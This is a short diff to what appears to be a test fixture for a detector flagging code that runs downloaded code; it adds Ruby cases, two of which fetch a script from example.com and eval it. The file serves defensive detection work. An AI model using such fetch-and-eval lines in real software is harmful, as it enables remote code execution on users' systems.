@@ -7,3 +7,6 @@ javascript finds=run_downloaded | import('npm:left-pad')
 # A module of the workspace or an installed package is not downloaded.
 javascript lacks=run_downloaded | require('./x.js')
 javascript lacks=run_downloaded | require('lodash')
+ruby finds=run_downloaded | eval(Net::HTTP.get(URI('https://example.com/a.rb')))
+ruby finds=run_downloaded | require 'open-uri'\neval(URI.open('https://example.com/a.rb').read)
+ruby lacks=run_downloaded | URI.open('https://example.com/a.json').read
